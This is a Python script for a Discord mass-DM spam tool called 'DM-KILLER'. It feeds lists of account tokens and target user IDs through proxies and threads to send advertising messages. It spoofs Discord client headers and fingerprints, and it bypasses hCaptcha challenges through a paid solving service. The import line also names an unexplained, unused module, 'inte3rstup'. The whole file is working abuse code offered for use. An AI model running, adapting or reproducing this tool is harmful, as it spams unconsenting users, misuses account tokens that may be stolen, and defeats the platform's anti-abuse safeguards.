import requests,os,discord,datetime,threading,sys,inte3rstup
import json as js
from capmonster_python import HCaptchaTask
from time import sleep
from colorama import Fore


message =   {
    "content": "**hey user check out https://github.com/vqea**"
  }


tokens = open("tokens.txt", "r").read().splitlines()
ids = open("ids.txt", "r").read().splitlines()

version = 3.2
token_counter = 0
id_counter = 0
dm_success = 0
dm_failed = 0
tokens_left = len(tokens)
threads_list = list()
initial_title = f"DM-KILLER v{version} | Starting.."

settings = open('config.json')
config = js.load(settings)

if os.name == 'nt':
	os.system("cls")
	os.system(f'title "{initial_title}"')
else:
	os.system("clear")
	sys.stdout.write(f"\x1b]2;{initial_title}\x07")

print(f'''{Fore.BLUE}
 ██████╗ ███╗   ███╗      ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ 
 ██╔══██╗████╗ ████║      ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
 ██║  ██║██╔████╔██║█████╗█████╔╝ ██║██║     ██║     █████╗  ██████╔╝
 ██║  ██║██║╚██╔╝██║╚════╝██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
 ██████╔╝██║ ╚═╝ ██║      ██║  ██╗██║███████╗███████╗███████╗██║  ██║
 ╚═════╝ ╚═╝     ╚═╝      ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝{Fore.RESET} v{version} {Fore.RESET}''')

if config['proxy'] != "":
	proxies = { "https": f"http://{config['proxy']}" }
else:
	proxies = None

print(f"{Fore.LIGHTBLUE_EX} -> Loaded Tokens: {Fore.RESET}{len(tokens)}{Fore.LIGHTBLUE_EX}\n{Fore.LIGHTBLUE_EX} -> Loaded IDS: {Fore.RESET}{len(ids)}{Fore.RESET}\n")
print(f" > Starting {Fore.LIGHTBLUE_EX}Massdm..{Fore.RESET}\n")

def send_dm(token_counter):

	global id_counter

	headers = {
		"x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjkzLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvOTMuMCIsImJyb3dzZXJfdmVyc2lvbiI6IjkzLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAwODA0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
		"sec-fetch-dest": "empty",
		"x-debug-options": "bugReporterEnabled",
		"sec-fetch-mode": "cors",
		"sec-fetch-site": "same-origin",
		"accept": "*/*",
		"accept-language": "en-GB",
		"content-type": "application/json",
		"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.16 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
		"TE": "trailers"
	}

	headers_reg = {
	    "accept": "*/*",
	    "authority": "discord.com",
	    "method": "POST",
	    "path": "/api/v9/auth/register",
	    "scheme": "https",
	    "origin": "discord.com",
	    "referer": "discord.com/register",
	    "x-debug-options": "bugReporterEnabled",
	    "accept-language": "en-US,en;q=0.9",
	    "connection": "keep-alive",
	    "content-Type": "application/json",
	    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
	    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTA0OTY3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==",
	    "sec-fetch-dest": "empty",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-site": "same-origin"
	}

	def request_cookie():
		response1 = requests.get("https://discord.com", proxies=proxies, timeout=20)
		cookie = response1.cookies.get_dict()
		cookie['locale'] = "us"
		return cookie

	def request_fingerprint():
		response2 = requests.get("https://discordapp.com/api/v9/experiments", headers=headers_reg, proxies=proxies, timeout=20).json()
		fingerprint = response2["fingerprint"]
		return fingerprint

	def request_snowflake():
		snakeflow = discord.utils.time_snowflake(datetime_obj=datetime.datetime.now())
		return snakeflow

	def captcha_bypass(token, url, key, captcha_rqdata):
		capmonster = HCaptchaTask(config['capmonster_apikey'])
		capmonster.set_user_agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.16 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36")
		task_id = capmonster.create_task(url, key, is_invisible=True, custom_data=captcha_rqdata)
		result = capmonster.join_task_result(task_id)
		response = result.get("gRecaptchaResponse")
		dateTimeObj = datetime.datetime.now()
		timestampStr = dateTimeObj.strftime("%H:%M:%S")
		print(f"{Fore.LIGHTGREEN_EX} [{timestampStr}] [CAPTCHA SOLVED] {Fore.LIGHTBLACK_EX}({response[-32:]}) ({token[:36]}*****){Fore.RESET}")
		return response

	def check(token):
		headers['x-fingerprint'] = request_fingerprint()
		headers['authorization'] = token
		response = requests.get(f"https://discord.com/api/v9/users/@me/guilds", headers=headers, cookies=request_cookie(), proxies=proxies, timeout=20)
		if config['server_id'] in response.text:
			return True
	
	def title_update(success, bad, left):
		avg = (success + bad) / len(tokens)
		title = f"DM-KILLER v{version} | SENT: {success} | FAILED: {bad} | AVG: {avg} | Tokens Left: {left}"
		if os.name == 'nt':
			os.system(f'title "{title}"')
		else:
			sys.stdout.write(f"\x1b]2;{title}\x07")

	def sent_dm(id):
		global dm_success
		sent = open("data/dm_sent.txt", "a")
		sent.write(id + "\n")
		sent.close()
		dm_success += 1

	def fail_dm(id):
		global dm_failed
		fail = open("data/dm_fail.txt", "a")
		fail.write(id + "\n")
		fail.close()
		dm_failed += 1

	def open_channel(authorization, userID):
		json_data = {'recipient_id': userID}
		headers['x-fingerprint'] = request_fingerprint()
		headers['authorization'] = authorization
		headers['x-context-properties'] = "e30="
		response3 = requests.post("https://discord.com/api/v9/users/@me/channels", headers=headers, cookies=request_cookie(), json=json_data, proxies=proxies, timeout=20).json()
		channel = response3["id"]
		return channel

	def send_message(authorization, channel, msg, userID):
		dateTimeObj = datetime.datetime.now()
		timestampStr = dateTimeObj.strftime("%H:%M:%S")
		snakeflow = request_snowflake()
		json = {'content': msg["content"], 'nonce': snakeflow, 'tts': "false"}
		headers['x-fingerprint'] = request_fingerprint()
		headers['authorization'] = authorization
		headers['referer'] = "https://discord.com/channels/@me/" + str(channel)
		response4 = requests.post("https://discord.com/api/v9/channels/" + str(channel) + "/messages", headers=headers, cookies=request_cookie(), data=js.dumps(json).replace("<user>", f"<@{userID}>").replace("<id>", f"{userID}"), proxies=proxies, timeout=20)
		if response4.status_code == 200:
			print(f"{Fore.LIGHTGREEN_EX} [{timestampStr}] [SENT] {userID} {Fore.LIGHTBLACK_EX}({authorization[:36]}*****) {Fore.RESET}")
			sent_dm(userID)
		elif response4.status_code == 403:
			print(f"{Fore.LIGHTRED_EX} [{timestampStr}] [CLOSED] {userID} {Fore.LIGHTBLACK_EX}({authorization[:36]}*****) {Fore.RESET}")
			fail_dm(userID)
		elif response4.status_code == 400:
			print(f"{Fore.YELLOW} [{timestampStr}] [CAPTCHA] {response4.json()['captcha_sitekey']} {Fore.LIGHTBLACK_EX}({authorization[:36]}*****) {Fore.RESET}")
			json2 = {'captcha_key': captcha_bypass(authorization, "https://discord.com", f"{response4.json()['captcha_sitekey']}", response4.json()['captcha_rqdata']), 'captcha_rqtoken': response4.json()['captcha_rqtoken'], 'content': msg["content"], 'nonce': snakeflow, 'tts': "false"}
			response5 = requests.post("https://discord.com/api/v9/channels/" + str(channel) + "/messages", headers=headers, cookies=request_cookie(), data=js.dumps(json2).replace("<user>", f"<@{userID}>").replace("<id>", f"{userID}"), proxies=proxies, timeout=20)
			if response5.status_code == 200:
				print(f"{Fore.LIGHTGREEN_EX} [{timestampStr}] [SENT] {userID}{Fore.LIGHTBLACK_EX}({authorization[:36]}*****) {Fore.RESET}")
				sent_dm(userID)
			elif response5.status_code == 403:
				print(f"{Fore.LIGHTRED_EX} [{timestampStr}] [CLOSED] {userID} {Fore.LIGHTBLACK_EX}({authorization[:36]}*****) {Fore.RESET}")
				fail_dm(userID)
			else:
				print(f"{Fore.LIGHTRED_EX} [{timestampStr}] [ERROR] {userID} {Fore.LIGHTBLACK_EX}({authorization[:36]}*****) ({response5.text}){Fore.RESET}")
				fail_dm(userID)
		else:
			print(f"{Fore.LIGHTRED_EX} [{timestampStr}] [ERROR] {userID} {Fore.LIGHTBLACK_EX}({authorization[:36]}*****) ({response4.text}){Fore.RESET}")
			fail_dm(userID)

	def dm(token, userID, message):
		
		global tokens_left
		
		try:
			if check(token):
				channel = open_channel(token, userID)
				send_message(token, channel, message, userID)
				return True
			else:
				dateTimeObj = datetime.datetime.now()
				timestampStr = dateTimeObj.strftime("%H:%M:%S")
				print(f"{Fore.RED} [{timestampStr}] [TOKEN REMOVED] ({token[:36]}*****){Fore.RESET}")
				bad = open("data/bad_tokens.txt", 'a')
				bad.write(token + "\n")
				bad.close()
				tokens_left = tokens_left - 1
		except:
			pass

	for x in range(len(ids)):
		try:

			title_update(dm_success, dm_failed, tokens_left)

			if tokens[token_counter] not in open("data/bad_tokens.txt", "r").read():

				dateTimeObj = datetime.datetime.now()
				timestampStr = dateTimeObj.strftime("%H:%M:%S")

				if id_counter >= len(ids)-1:
					input(f"\n{Fore.LIGHTGREEN_EX} [{timestampStr}] COMPLETED{Fore.RESET}\n")

				id_counter += 1

				if ids[id_counter] not in open("data/dm_sent.txt", "r").read() and ids[id_counter] not in open("data/dm_fail.txt", "r").read():

					dm(tokens[token_counter], ids[id_counter], message)
					sleep(100)
					
					if tokens[token_counter] not in open("data/bad_tokens.txt", "r").read():
						print(f"{Fore.YELLOW} [{timestampStr}] [RATELIMIT] Sleeping.. {Fore.LIGHTBLACK_EX}({tokens[token_counter][:36]}*****){Fore.RESET}")
				else:
					print(f"{Fore.BLUE} [{timestampStr}] [SKIPPING] {ids[id_counter]}{Fore.RESET}")

		except Exception as err:
			print(err)
			pass

for i in range(len(tokens)):
	t = threading.Thread(target=send_dm, args=(token_counter,))
	t.daemon = True
	token_counter += 1
	threads_list.append(t)

for t in threads_list:
	t.start()
	sleep(.5)

for t in threads_list:
	t.join()

input(f" {Fore.BLUE}\nDONE\n{Fore.RESET}")
